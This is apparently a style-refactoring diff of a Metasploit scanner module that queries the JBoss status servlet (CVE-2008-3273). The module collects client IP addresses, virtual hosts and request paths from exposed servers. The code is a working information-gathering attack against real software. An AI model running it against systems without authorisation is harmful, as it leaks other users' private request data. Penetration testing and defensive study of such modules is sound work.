@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -14,11 +14,11 @@ class MetasploitModule < Msf::Auxiliary
   def initialize
     super(
       'Name'        => 'JBoss Status Servlet Information Gathering',
-      'Description' => %q{
+      'Description' => %q(
         This module queries the JBoss status servlet to collect sensitive
         information, including URL paths, GET parameters and client IP addresses.
         This module has been tested against JBoss 4.0, 4.2.2 and 4.2.3.
-      },
+      ),
       'References'  =>
         [
           ['CVE', '2008-3273'],
@@ -31,47 +31,43 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     register_options([
-      Opt::RPORT(8080),
-      OptString.new('TARGETURI', [ true,  'The JBoss status servlet URI path', '/status'])
-    ], self.class)
+                       Opt::RPORT(8080),
+                       OptString.new('TARGETURI', [ true, 'The JBoss status servlet URI path', '/status'])
+                     ], self.class)
   end
 
   def run_host(target_host)
     jpath = normalize_uri(target_uri.to_s)
 
-    @requests  = []
+    @requests = []
 
     vprint_status("#{rhost}:#{rport} - Collecting data through #{jpath}...")
 
-    res = send_request_raw({
-      'uri'    => jpath,
-      'method' => 'GET'
-    })
+    res = send_request_raw('uri' => jpath,
+                           'method' => 'GET')
 
     # detect JBoss application server
-    if res and res.code == 200 and res.body.match(/<title>Tomcat Status<\/title>/)
-      http_fingerprint({:response => res})
+    if res && (res.code == 200) && res.body.match(/<title>Tomcat Status<\/title>/)
+      http_fingerprint(response: res)
 
       html_rows = res.body.split(/<strong>/)
       html_rows.each do |row|
-
-        #Stage      Time    B Sent  B Recv  Client  VHost   Request
-        #K  150463510 ms    ?       ?       1.2.3.4 ?       ?
+        # Stage      Time    B Sent  B Recv  Client  VHost   Request
+        # K  150463510 ms    ?       ?       1.2.3.4 ?       ?
 
         # filter client requests
-        if row.match(/(.*)<\/strong><\/td><td>(.*)<\/td><td>(.*)<\/td><td>(.*)<\/td><td>(.*)<\/td><td nowrap>(.*)<\/td><td nowrap>(.*)<\/td><\/tr>/)
+        next unless row =~ /(.*)<\/strong><\/td><td>(.*)<\/td><td>(.*)<\/td><td>(.*)<\/td><td>(.*)<\/td><td nowrap>(.*)<\/td><td nowrap>(.*)<\/td><\/tr>/
 
-          j_src  = $5
-          j_dst  = $6
-          j_path = $7
+        j_src  = Regexp.last_match(5)
+        j_dst  = Regexp.last_match(6)
+        j_path = Regexp.last_match(7)
 
-          @requests << [j_src, j_dst, j_path]
-        end
+        @requests << [j_src, j_dst, j_path]
       end
-    elsif res and res.code == 401
+    elsif res && (res.code == 401)
       vprint_error("#{rhost}:#{rport} - Authentication is required")
       return
-    elsif res and res.code == 403
+    elsif res && (res.code == 403)
       vprint_error("#{rhost}:#{rport} - Forbidden")
       return
     else
@@ -80,30 +76,26 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # show results
-    unless @requests.empty?
-      show_results(target_host)
-    end
+    show_results(target_host) unless @requests.empty?
   end
 
   def show_results(target_host)
     print_good("#{rhost}:#{rport} JBoss application server found")
 
     req_table = Rex::Text::Table.new(
-      'Header'  => 'JBoss application server requests',
-        'Indent'  => 1,
-        'Columns' => ['Client', 'Vhost target', 'Request']
+      'Header' => 'JBoss application server requests',
+      'Indent'  => 1,
+      'Columns' => ['Client', 'Vhost target', 'Request']
     )
 
     @requests.each do |r|
       req_table << r
-      report_note({
-        :host  => target_host,
-        :proto => 'tcp',
-        :sname => (ssl ? 'https' : 'http'),
-        :port  => rport,
-        :type  => 'JBoss application server info',
-        :data  => "#{rhost}:#{rport} #{r[2]}"
-      })
+      report_note(host: target_host,
+                  proto: 'tcp',
+                  sname: (ssl ? 'https' : 'http'),
+                  port: rport,
+                  type: 'JBoss application server info',
+                  data: "#{rhost}:#{rport} #{r[2]}")
     end
 
     print_line
